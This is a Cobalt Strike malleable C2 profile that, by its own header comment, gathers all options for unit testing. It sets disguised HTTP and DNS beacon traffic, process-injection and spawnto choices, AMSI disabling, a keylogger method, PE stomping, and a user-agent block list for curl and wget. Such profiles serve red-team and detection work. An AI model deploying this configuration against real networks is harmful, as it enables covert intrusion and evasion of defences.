#This profile tries to get all available options in one place for unit testing purposes.

set sample_name "Test Profile";
set host_stage "true"; 
set jitter "0";
set pipename "msagent_###"; 
set pipename_stager "status_##";
set sleeptime "60000";
set smb_frame_header "";
set ssh_banner "Cobalt Strike 4.2";
set ssh_pipename "postex_ssh_####";
set tcp_frame_header "";
set tcp_port "4444";
set data_jitter "0";

#This is used only in http-get and http-post and not during stage
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "1.2.3.4";
    set dns_max_txt          "199";
    set dns_sleep            "1";
    set dns_ttl              "5";
    set maxdns               "200";
    set dns_stager_prepend   "doc-stg-prepend";
    set dns_stager_subhost   "doc-stg-sh.";
    # DNS subhost override options added in 4.3:
    set beacon               "doc.bc.";
    set get_A                "doc.1a.";
    set get_AAAA             "doc.4a.";
    set get_TXT              "doc.tx.";
    set put_metadata         "doc.md.";
    set put_output           "doc.po.";

    set ns_response          "zero";
}

http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive""timeout=5, max=100";
    header "Connection""Keep-Alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
}

https-certificate {
    set C "US";
    set CN "localhost";
    set L "San Francisco";
    set OU "IT Services";
    set O "FooCorp";
    set ST "CA";
    set validity "365";
	set keystore "domain.store";
	set password "mypassword";
}

code-signer {
    set keystore "keystore.jks";
    set password "password";
    set alias "server";
    set digest_algorithm "SHA256";
    set timestamp "false";
    set timestamp_url "set://timestamp.digicert.com";
}

http-stager {
    set uri_x86 "/api/v1/GetLicence";     
    set uri_x64 "/api/v2/GetLicence";
    client {
        parameter "uuid" "96c5f1e1-067b-492e-a38b-4f6290369121";
        #header "headername" "headervalue";
    }
    server {
        header "Content-Type" "application/octet-stream";    
        header "Content-Encoding" "gzip";    
        output {        
            #GZIP headers and footers
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
            #AFAICT print is the only supported terminator
            print;
        }
    }
}

# define indicators for an set GET
http-get {
	# we require a stub URI to attach the rest of our data to.
	set uri "/api/v1/Updates";

	client {

        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
		metadata {
			mask;
			#base64url;
			base64;
            #netbios;

            #netbiosu;
            append ";" ;

            # Prepend a string
            prepend "SESSION=";
            # Terminator statements - these say where the metadata goes
            # Pick one

            # Append to URI
			#uri-append;


            
            #Set in a header
            header "Cookie";

            #Send data as transaction body
            #print

            #Store data in a URI parameter
            #parameter "someparam"

		}
	}

	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";
		# prepend some text in case the GET is empty.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}

# define indicators for an set POST
http-post {
	set uri "/api/v1/Telemetry/Id/";
	set verb "POST";

	client {
		# make it look like we're posting something cool.
		header "Content-Type" "application/json";
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";

		# ugh, our data has to go somewhere!
		output {

			mask;
			base64url;
			uri-append;
		}

		# randomize and post our session ID
		id {
			mask;
			base64url;
			prepend "{version: 1, d=\x22";            
			append "\x22}\n";
			print;
		}
	}

	# The server's response to our set POST
	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";

		# post usually sends nothing, so let's prepend a string, mask it, and
		# base64 encode it. We'll get something different back each time.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}

        
	}
}


stage {
    

#    The transform-x86 and transform-x64 blocks pad and transform Beacon’s
# Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 {
        prepend "\x90\x90";
        strrep "ReflectiveLoader" "DoLegitStuff";
    }
    
    #transform-x64 {
        # transform the x64 rDLL stage, same options as with 
    #}
    stringw "I am not Beacon";

    set allocator "MapViewOfFile";  # HeapAlloc,MapViewOfFile, and VirtualAlloc. 
    set cleanup "true";        # Ask Beacon to attempt to free memory associated with 
                                # the Reflective DLL package that initialized it.
    
    # Override the first bytes (MZ header included) of Beacon's Reflective DLL. 
    # Valid x86 instructions are required. Follow instructions that change
    # CPU state with instructions that undo the change.
    
#    set magic_mz_x86 "MZRE";
#    set magic_mz_x86 "MZAR";

    set magic_pe "PE";  #Override PE marker with something else

    # Ask the x86 ReflectiveLoader to load the specified library and overwrite
    #  its space instead of allocating memory with VirtualAlloc.
    # Only works with VirtualAlloc
    #set module_x86 "xpsservices.dll";
    #set module_x64 "xpsservices.dll";

    # Obfuscate the Reflective DLL’s import table, overwrite unused header content, 
    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
    set obfuscate "false"; 

    # Obfuscate Beacon, in-memory, prior to sleeping
    set sleep_mask "false";

    # Use embedded function pointer hints to bootstrap Beacon agent without 
    # walking kernel32 EAT
    set smartinject "true";

    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after 
    # it loads Beacon payload
    set stomppe "true";


    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
    set userwx "false";

    # PE header cloning - see "petool", skipped for now
    set compile_time "14 Jul 2018 8:14:00";
#    set image_size_x86 "512000";
#    set image_size_x64 "512000";
    set entry_point "92145";

    #The Exported name of the Beacon DLL
    #set name "beacon.x64.dll" 
    
    #set rich_header  # I don't understand this yet TODO: fixme

    #TODO: add examples process-inject 
}
process-inject {
        # set how memory is allocated in a remote process
        # VirtualAllocEx or NtMapViewOfSection. The
        # NtMapViewOfSection option is for same-architecture injection only. 
        # VirtualAllocEx is always used for cross-arch memory allocations.

        set allocator "VirtualAllocEx";
        # shape the memory characteristics and content
        set min_alloc "16384";
        set startrwx "true";
        set userwx "false";
        transform-x86 {
        prepend "\x90\x90";
        }
        #transform-x64 {
        # transform x64 injected content
        #}
        # determine how to execute the injected code
        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart";
            SetThreadContext;
            RtlCreateUserThread;
        }
}
post-ex {
    # control the temporary process we spawn to
    set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
    set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
    # change our post-ex output named pipe names...
    set pipename "msrpc_####, win\\msrpc_##";
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";


    #The thread_hint option allows multi-threaded post-ex DLLs to spawn 
    # threads with a spoofed start address. Specify the thread hint as 
    # “module!function+0x##” to specify the start address to spoof. 
    # The optional 0x## part is an offset added to the start address.
    # set thread_hint "....TODO:FIXME"

    # options are: GetAsyncKeyState (def) or SetWindowsHookEx
    set keylogger "GetAsyncKeyState";
}




